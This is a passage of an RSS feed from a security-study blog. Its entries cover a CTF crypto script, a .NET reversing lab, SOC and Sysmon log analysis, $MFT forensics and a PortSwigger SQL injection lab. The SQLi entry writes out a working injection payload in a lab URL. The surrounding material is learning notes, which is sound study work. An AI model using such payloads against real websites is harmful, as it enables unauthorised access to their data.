&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> math
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>FLAG &lt;span style="color:#f92672">+=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">128&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>keys &lt;span style="color:#f92672">=&lt;/span> [pow(random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (i&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) ), &lt;span style="color:#ae81ff">65537&lt;/span>, p) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">5&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enc &lt;span style="color:#f92672">=&lt;/span> flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">5&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enc &lt;span style="color:#f92672">=&lt;/span> enc &lt;span style="color:#f92672">*&lt;/span> keys[i] &lt;span style="color:#f92672">%&lt;/span> p
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hint &lt;span style="color:#f92672">=&lt;/span> keys[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">4&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;p =&amp;#39;&lt;/span>, p)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;enc =&amp;#39;&lt;/span>, enc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;hint =&amp;#39;&lt;/span>, hint)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler&lt;/p></description></item><item><title>Simple Welcome 0x02 &amp; 0x05(Lab - Nine &amp; Nine-Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/</guid><description>&lt;h1 id="simple-welcome-0x02--0x05lab---nine--nine-revenge">
 Simple Welcome 0x02 &amp;amp; 0x05(Lab - Nine &amp;amp; Nine-Revenge)
 &lt;a class="anchor" href="#simple-welcome-0x02--0x05lab---nine--nine-revenge">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.tutorialspoint.com/convert-frombase64string-string-method-in-chash#">Convert.FromBase64String(String) Method in C#&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.string.substring?view=net-7.0">String.Substring 方法&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler C# From dnSpy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Nine.Stage&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Token: 0x0600000D RID: 13 RVA: 0x00002694 File Offset: 0x00000894&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Flag()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">this&lt;/span>.font = &lt;span style="color:#66d9ef">new&lt;/span> Font(&lt;span style="color:#66d9ef">this&lt;/span>.fontFamily, &lt;span style="color:#ae81ff">35f&lt;/span>, FontStyle.Regular);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">byte&lt;/span>[] array = Convert.FromBase64String(&lt;span style="color:#e6db74">&amp;#34;LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=&amp;#34;&lt;/span>.Replace(&lt;span style="color:#e6db74">&amp;#34;pui&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>).Substring(&lt;span style="color:#ae81ff">1&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i = &lt;span style="color:#ae81ff">0&lt;/span>; i &amp;lt; array.Length; i++)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		array[i] ^= &lt;span style="color:#ae81ff">135&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">this&lt;/span>.SetMessageBox(Encoding.UTF8.GetString(array));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>起手式一定用DIE或其他檢測tool看一下是用哪種東西編譯或有沒有加殼
&lt;img src="https://hackmd.io/_uploads/SksyjD8K3.png" alt="" />
我一開始以為可以用IDA之類的東西反編譯他，但是顯然IDA沒辦法解析&lt;code>.NET&lt;/code> file，這一題也是看了別人的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>才知道有&lt;a href="https://github.com/dnSpy/dnSpy/releases">dnSpy&lt;/a>這東西可以用
&lt;img src="https://hackmd.io/_uploads/rkiIiwUK3.png" alt="" />&lt;/li>
&lt;li>執行程式
實際執行起來會發現它就是個小遊戲，可以用方向鍵操控人移動或是移開石頭，重點是要拿到鑰匙並開鎖拿到旗子，玩了好久都沒成功，所以想說可以用dnSpy看一下可以用的東西
&lt;img src="https://hackmd.io/_uploads/rkR8cPIt2.png" alt="" />&lt;/li>
&lt;li>用dnSpy看source code
在&lt;code>/Nine/Nine.exe/Nine/Stage@02000004/Flag()&lt;/code>以及&lt;code>/Nine-revenge/Nine-revenge.exe/Nine/Stage@02000004/Flag()&lt;/code>都可以直接看到flag function怎麼寫的，所以其實這一題只要知道dnSpy這東西，其實就過於簡單
:::spoiler Function Path Screenshot
&lt;img src="https://hackmd.io/_uploads/HkHxLuUYh.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/SyW-8OUK3.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>也是可以直接用C#的線上editor，不過如果不會寫的話就可以直接看source code然後用熟悉的語言寫script&lt;/p></description></item><item><title>Special Topic of Tzu-Chi at TCIVS</title><link>https://bernie6401.github.io/docs/side-project/special-topic-of-tzu-chi-at-tcivs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/side-project/special-topic-of-tzu-chi-at-tcivs/</guid><description>&lt;h1 id="special-topic-of-tzu-chi-at-tcivs">
 Special Topic of Tzu-Chi at TCIVS
 &lt;a class="anchor" href="#special-topic-of-tzu-chi-at-tcivs">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-tcivs-side-project-special-topic">
 tags: &lt;code>TCIVS&lt;/code> &lt;code>Side Project&lt;/code> &lt;code>Special Topic&lt;/code>
 &lt;a class="anchor" href="#tags-tcivs-side-project-special-topic">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="purpose-of-this-file">
 Purpose of this file
 &lt;a class="anchor" href="#purpose-of-this-file">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>I just want to write up some problems while I set up the environment and hardware of this project&lt;/li>
&lt;/ul>
&lt;h2 id="hardware-info">
 Hardware info.
 &lt;a class="anchor" href="#hardware-info">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Spec.&lt;/th>
 &lt;th style="text-align: center">Raspberry Pi 3 Model B+&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">CPU&lt;/td>
 &lt;td style="text-align: center">ARM Cortex-A53 1.4GHz&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">RAM&lt;/td>
 &lt;td style="text-align: center">1GB SRAM&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Wi-Fi&lt;/td>
 &lt;td style="text-align: center">2.4GHz and 5GHz&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Ethernet speed&lt;/td>
 &lt;td style="text-align: center">300Mbps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Bluetooth&lt;/td>
 &lt;td style="text-align: center">4..2&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="set-up-sequenceideal">
 Set up sequence(Ideal)
 &lt;a class="anchor" href="#set-up-sequenceideal">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Install OS to Raspberry pi
&lt;blockquote>
&lt;p>You can just check this &lt;a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#4-boot-ubuntu-server">page&lt;/a>&lt;/p></description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</guid><description>&lt;h1 id="sqli---apprentice">
 SQLi - APPRENTICE
 &lt;a class="anchor" href="#sqli---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">
 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 &lt;a class="anchor" href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: &lt;code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20#&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/pPKFYKj.png" alt="" />
:::&lt;/p></description></item><item><title>TaiwanHolyHigh - SoC基礎維運 - ArcSight教學</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/</guid><description>&lt;h1 id="taiwanholyhigh---soc基礎維運---arcsight教學">
 TaiwanHolyHigh - SoC基礎維運 - ArcSight教學
 &lt;a class="anchor" href="#taiwanholyhigh---soc%e5%9f%ba%e7%a4%8e%e7%b6%ad%e9%81%8b---arcsight%e6%95%99%e5%ad%b8">#&lt;/a>
&lt;/h1>
&lt;h2 id="set-up">
 Set Up
 &lt;a class="anchor" href="#set-up">#&lt;/a>
&lt;/h2>
&lt;p>先進到https://bit.ly/44IFecN下載ArcSight Console，並且全部default下一步&lt;/p>
&lt;ol>
&lt;li>(editor需要admin權限)進入localhost host DNS解析 -&amp;gt; C:\Windows\System32\drivers\etc\host
新增 211.75.237.80 chtpoc&lt;/li>
&lt;li>打開ArcSight Console，用之前提供的帳密以及最後打chtpoc，進行登入
&lt;img src="https://hackmd.io/_uploads/B1_MkKc8p.png" alt="圖片" />&lt;/li>
&lt;li>登入之後的狀態
&lt;img src="https://hackmd.io/_uploads/BJNleKc8p.png" alt="圖片" />&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Hy8IUYqIa.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/Syx6UK986.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/S1vRUKcUp.png" alt="圖片" />
ArcSight預設有分大小寫
&lt;img src="https://hackmd.io/_uploads/SJrXPY5UT.png" alt="圖片" />&lt;/p>
&lt;p>活動頻道可以儲存0
&lt;img src="https://hackmd.io/_uploads/SJCEqt9Up.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/HkSr5t5La.png" alt="圖片" />&lt;/p>
&lt;h2 id="規則">
 規則
 &lt;a class="anchor" href="#%e8%a6%8f%e5%89%87">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>WAF規則
&lt;img src="https://hackmd.io/_uploads/B1Ljrc9UT.png" alt="圖片" />&lt;/li>
&lt;li>Firewall規則
&lt;img src="https://hackmd.io/_uploads/rJY6S55IT.png" alt="圖片" />&lt;/li>
&lt;li>IPS
&lt;img src="https://hackmd.io/_uploads/Bykw2m3Ia.png" alt="image" />&lt;/li>
&lt;li>Firewall-BotNet
&lt;img src="https://hackmd.io/_uploads/HkZK2QnIT.png" alt="image" />&lt;/li>
&lt;li>Snort
&lt;img src="https://hackmd.io/_uploads/rJ3onmnUp.png" alt="image" />&lt;/li>
&lt;li>Trojan
&lt;img src="https://hackmd.io/_uploads/BkPhnX2U6.png" alt="image" />&lt;/li>
&lt;li>WineventLog
&lt;img src="https://hackmd.io/_uploads/SkSan7hUT.png" alt="image" />&lt;/li>
&lt;/ul>
&lt;h2 id="清單">
 清單
 &lt;a class="anchor" href="#%e6%b8%85%e5%96%ae">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>抑制清單
&lt;img src="https://hackmd.io/_uploads/rkPcT7hL6.png" alt="image" />&lt;/li>
&lt;li>弱掃清單
&lt;img src="https://hackmd.io/_uploads/HJNlNSnU6.png" alt="image" />&lt;/li>
&lt;/ul>
&lt;h2 id="規則-1">
 規則
 &lt;a class="anchor" href="#%e8%a6%8f%e5%89%87-1">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>即時規則
&lt;img src="https://hackmd.io/_uploads/BJFeaX2La.png" alt="image" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>中繼站監控
&lt;img src="https://hackmd.io/_uploads/HyqNaX3Lp.png" alt="image" />
&lt;img src="https://hackmd.io/_uploads/H1mr672Up.png" alt="image" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>中繼站監控持續連線
&lt;img src="https://hackmd.io/_uploads/Sk4wpm28T.png" alt="image" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>WAF弱掃
&lt;img src="https://hackmd.io/_uploads/H1kMNHhL6.png" alt="image" />
&lt;img src="https://hackmd.io/_uploads/rJ6GEHnUp.png" alt="image" />
&lt;img src="https://hackmd.io/_uploads/HymmES386.png" alt="image" />&lt;/p></description></item><item><title>TaiwanHolyHigh - SoC基礎維運 - HW2</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/</guid><description>&lt;h1 id="taiwanholyhigh---soc基礎維運---hw2">
 TaiwanHolyHigh - SoC基礎維運 - HW2
 &lt;a class="anchor" href="#taiwanholyhigh---soc%e5%9f%ba%e7%a4%8e%e7%b6%ad%e9%81%8b---hw2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/sysinternals/downloads/sysmon">Sysmon Event ID&lt;/a>
&lt;blockquote>
&lt;h3 id="事件識別碼-1處理程序建立">
 事件識別碼 1：處理程序建立
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-1%e8%99%95%e7%90%86%e7%a8%8b%e5%ba%8f%e5%bb%ba%e7%ab%8b">#&lt;/a>
&lt;/h3>
&lt;p>處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 &lt;code>ProcessGUID&lt;/code> 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 &lt;code>HashType&lt;/code> 欄位中的演算法。&lt;/p>
&lt;hr>
&lt;h3 id="事件識別碼-8createremotethread">
 事件識別碼 8：CreateRemoteThread
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-8createremotethread">#&lt;/a>
&lt;/h3>
&lt;p>&lt;code>CreateRemoteThread&lt;/code> 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、&lt;code>StartModule&lt;/code> 和 &lt;code>StartFunction&lt;/code>。 請注意，系統會推斷 &lt;code>StartModule&lt;/code> 和 &lt;code>StartFunction&lt;/code> 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。&lt;/p>
&lt;hr>
&lt;h3 id="事件識別碼-11filecreate">
 事件識別碼 11：FileCreate
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-11filecreate">#&lt;/a>
&lt;/h3>
&lt;p>建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。&lt;/p>
&lt;hr>
&lt;h3 id="事件識別碼-13registryevent-值已設定">
 事件識別碼 13：RegistryEvent (值已設定)
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-13registryevent-%e5%80%bc%e5%b7%b2%e8%a8%ad%e5%ae%9a">#&lt;/a>
&lt;/h3>
&lt;p>此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 &lt;code>DWORD&lt;/code> 和 &lt;code>QWORD&lt;/code> 的登錄值所寫入的值。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="recon---event-log呈現的攻擊順序">
 Recon - Event Log呈現的攻擊順序
 &lt;a class="anchor" href="#recon---event-log%e5%91%88%e7%8f%be%e7%9a%84%e6%94%bb%e6%93%8a%e9%a0%86%e5%ba%8f">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Event ID: 8 → CreateRemoteThread
首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉
&lt;img src="https://hackmd.io/_uploads/rJjOTA-wa.png" alt="圖片" />
比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的&lt;a href="https://attack.mitre.org/techniques/T1055/001/">reflective dll injection&lt;/a>，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process
&lt;img src="https://hackmd.io/_uploads/Hy9wgyfPp.png" alt="圖片" />&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT Background</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---mft-background">
 TaiwanHolyHigh - Windows Forensics - $MFT Background
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---mft-background">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::
:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;code>$&lt;/code>在windows代表系統檔案&lt;/li>
&lt;li>&lt;code>$MFT&lt;/code>(Master File Table):&lt;/li>
&lt;li>&lt;a href="https://tw.easeus.com/partition-manager-tips/fat-file-system-format.html">&lt;code>FAT&lt;/code>(File Allocation Table)&lt;/a>:
&lt;blockquote>
&lt;p>Fat 檔案系統，簡稱 File Allocation Table，是微軟和 Caldera 開發組為 Windows 電腦開發的檔案系統
雖然它主要是電腦磁區類型，但在過去幾年中它已作為主要檔案系統格式用於各種手機裝置中。此外，由於它是一個 8 位檔案系統，因此簇數會隨著磁碟容量的增加而增加。
FAT12 - 12 位
FAT16 - 16 位
FAT32 - 32 位
我們還應該澄清，FAT 檔案系統從 1977 年開始使用，但 FAT32 是在 1996 年引入的&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;code>BIOS&lt;/code>(Basic Input Output System)&lt;/li>
&lt;li>&lt;a href="https://bbs.pigoo.com/thread-16131-1-1.html">&lt;code>POST&lt;/code>(Power On Self Test)&lt;/a>
&lt;blockquote>
&lt;p>POST自檢測過程大致為：加電－CPU－ROM－BIOS－System Clock－DMA－64KB RAM－IRQ－顯卡等。檢測顯卡以前的過程稱過關鍵部件測試，如果關鍵部件有問題，計算機會處於掛起狀態，習慣上稱為核心故障。另一類故障稱為非關鍵性故障，檢測完顯卡後，計算機將對64KB以上內存、I／O口、軟硬盤驅動器、鍵盤、即插即用設備、CMOS設置等進行檢測，並在屏幕上顯示各種信息和出錯報告。在正常情況下，POST過程進行得非常快，我們幾乎無法感覺到這個過程。
POST自檢測代碼含義是什麼？
當系統檢測到相應的錯誤時，會以兩種方式進行報告，即在屏幕上顯示出錯信息或以報警聲響次數的方式來指出檢測到的故障。&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---mft-resident--non-resident-file">
 TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---mft-resident--non-resident-file">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>$MFT儲存的內容&lt;/p>
&lt;ol>
&lt;li>==Status==&lt;/li>
&lt;li>==$MFT Record==(File Identify/Location)&lt;/li>
&lt;li>==Timestamp==
&lt;ul>
&lt;li>Standard Info&lt;/li>
&lt;li>Filename&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==Resident==
&lt;ul>
&lt;li>特性如下:
&lt;ul>
&lt;li>$SO\ne 0$: 意思就是resident file的前面一定有其他檔案，而他一定不會是$MFT的開頭&lt;/li>
&lt;li>No File Slack: 沒有檔案暫存區，意味著他會住在一個剛剛好的大小的房間中&lt;/li>
&lt;li>Physical Size = Logical Size: 這個就和前一個有相關，logical size就是實際住進去房間的檔案大小，而physical size就是飯店給予我們房間的大小，所以$physical_size\ge logical_size$&lt;/li>
&lt;li>如果resident file因為駭客的攻擊(injection/trojan/backdoor&amp;hellip;)使得檔案大小變大，而失去原本resident file的身分，則該檔案就會被搬出目前的地方，就算之後檔案大小變回來，還是無法再住回原本的地方，這就是攻擊方所遺留的攻擊痕跡&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>如何判斷?如果檔名後面接的是&lt;code>18 00 00 00 01 00&lt;/code>就是resident file，例如：
:::spoiler 範例
&lt;img src="https://hackmd.io/_uploads/rynQ2dFGp.png" alt="" />
:::
或者是看&lt;code>18 00 00 00 10 00&lt;/code>的前面第二個byte(就是non-resident flag)，是&lt;code>00&lt;/code>代表不是non-resident file，反之就是
:::spoiler flag範例
&lt;img src="https://hackmd.io/_uploads/HkAy6_tMa.png" alt="" />
:::&lt;/li>
&lt;li>檔案大小
&lt;code>18 00 00 00 10 00&lt;/code>後面接著的四個bytes就是檔案大小$\to$換成10禁制就對了，另外如果此檔案是resident file，則檔案大小後面除了固定的&lt;code>18 00 00 00&lt;/code>以外，後面還會有該檔案原本的file signature，以此為例就是&lt;code>89 50 4E 47&lt;/code>也就是png的magical header
:::spoiler flag範例
&lt;img src="https://hackmd.io/_uploads/SkwzAOtGa.png" alt="" />
此範例就是&lt;code>02 02&lt;/code>$\to$514 bytes
:::&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==non-Resident File==
如果是non-resident file，檔名的後面一點會接的是&lt;code>80 00 00 00 48 00 00 00&lt;/code>，再後面就是non-resident flag
&lt;img src="https://hackmd.io/_uploads/HJk7NFtf6.png" alt="" />
另外，檔案的大小會在flag往後數40個bytes的地方，以底下範例來說就是&lt;code>F6 09 00 00&lt;/code>
&lt;img src="https://hackmd.io/_uploads/BJWMBtKMT.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h2 id="lab---resident-file">
 Lab - Resident File
